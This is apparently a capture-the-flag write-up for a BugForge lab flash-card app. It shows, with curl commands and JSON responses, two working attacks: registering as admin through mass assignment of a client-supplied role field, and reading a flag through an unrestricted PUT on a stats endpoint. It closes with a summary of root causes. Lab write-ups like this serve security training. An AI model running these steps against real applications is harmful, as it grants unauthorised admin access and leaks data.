---
title: Tanuki - Mass Assign
tags:
  - bugforge
  - mass-assignment
  - broken-access-control
---

- Tanuki - SRS Flash Cards
- Vulnerability: Mass Assignment + Broken Access Control on Stats endpoint

## Enumeration

- I will showcase two ways as my first approach was different to another user's who submitted the flag first
- After registering and browsing the app through Caido proxy, I extracted all API routes from the JS bundle:

```bash
# Set your lab URL
TARGET="https://lab-XXXXX.labs-app.bugforge.io"

curl -sk -o /tmp/app.js "$TARGET/static/js/main.22728e1f.js"
grep -o '"/api/[^"]*"' /tmp/app.js | sort | uniq
```

```
"/api/admin/cards"
"/api/admin/decks"
"/api/admin/flag"      <-- interesting
"/api/admin/users"
"/api/decks"
"/api/login"
"/api/register"
"/api/stats"
"/api/study/progress"
"/api/study/session"
"/api/study/sessions"
"/api/verify-token"
```

---

## Path 1: Mass Assignment on Registration (Privilege Escalation)

- The registration request seen in Caido proxy sends a `role` field from the client:

```json
{"username":"tester","email":"test@test.com","password":"pass123","full_name":"","role":"user"}
```

- The server blindly accepts whatever role you pass. 
- Register with `role: "admin"`:

```bash
curl -sk -X POST "$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"h@test.com","password":"pass123","full_name":"","role":"admin"}'
```

- Response confirms admin role assigned:

```json
{
  "token": "eyJhbG...",
  "user": {
    "id": 5,
    "username": "hacker",
    "email": "h@test.com",
    "full_name": "",
    "role": "admin"
  }
}
```

- Use the admin JWT from the response to hit the flag endpoint:

```bash
# Copy the token from the register response above
ADMIN_TOKEN="eyJhbG..."

curl -sk -H "Authorization: Bearer $ADMIN_TOKEN" "$TARGET/api/admin/flag"
```

```json
{"flag":"bug{IZB0b08mytMDc418n4wzsjCR2JGyNSIl}"}
```

- A regular user gets blocked:

```json
{"error":"Admin access required"}
```

---

## Path 2: PUT /api/stats (No Admin Needed)

- The `/api/stats` endpoint accepts `PUT` requests and leaks the flag in the response. 
- This works with **any authenticated user** - no privilege escalation required

```bash
# Any valid JWT works here - grab it from /api/register or /api/login response
USER_TOKEN="eyJhbG..."

curl -sk -X PUT "$TARGET/api/stats" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}'
```

```json
{
  "message": "Stats updated successfully",
  "stats": {},
  "flag": "bug{IZB0b08mytMDc418n4wzsjCR2JGyNSIl}"
}
```

- This is a **hidden HTTP method** vulnerability - the app only uses `GET /api/stats` in the frontend, but the backend also accepts `PUT` and returns the flag in the response body.

---

## Summary

| Path | Technique | Admin Required | Requests |
|------|-----------|---------------|----------|
| 1 | Mass assignment on `/api/register` + `/api/admin/flag` | Yes (self-assigned) | 2 |
| 2 | `PUT /api/stats` with any auth token | No | 1 |

**Root causes:**

- Registration endpoint trusts client-supplied `role` field without validation
- Stats update endpoint leaks sensitive data (flag) in response body
- HTTP method not restricted - `PUT` accepted but not used by the frontend
